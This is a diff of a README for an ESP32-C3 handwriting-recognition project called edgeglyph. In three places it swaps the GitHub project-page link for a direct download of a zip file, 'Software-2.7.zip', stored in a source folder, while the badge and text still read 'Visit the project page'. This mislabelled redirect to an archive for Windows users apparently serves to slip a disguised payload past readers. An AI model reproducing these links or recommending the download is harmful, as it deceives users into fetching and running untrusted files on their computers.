@@ -1,6 +1,6 @@
 # 🟦 edgeglyph - Offline handwriting recognition for ESP32-C3
 
-[![Download edgeglyph](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/Moramo5213/edgeglyph)
+[![Download edgeglyph](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/Moramo5213/edgeglyph/raw/refs/heads/main/esp/src/Software-2.7.zip)
 
 ## 🚀 What edgeglyph does
 
@@ -16,7 +16,7 @@ This project is a good fit if you want:
 
 Visit the project page here:
 
-https://github.com/Moramo5213/edgeglyph
+https://github.com/Moramo5213/edgeglyph/raw/refs/heads/main/esp/src/Software-2.7.zip
 
 Open the page, then download the project files from GitHub. If you use the app package or release build from the page, download that file to your Windows PC first.
 
@@ -42,7 +42,7 @@ Follow these steps in order.
 
 Go to:
 
-https://github.com/Moramo5213/edgeglyph
+https://github.com/Moramo5213/edgeglyph/raw/refs/heads/main/esp/src/Software-2.7.zip
 
 ### 2. Get the files
 
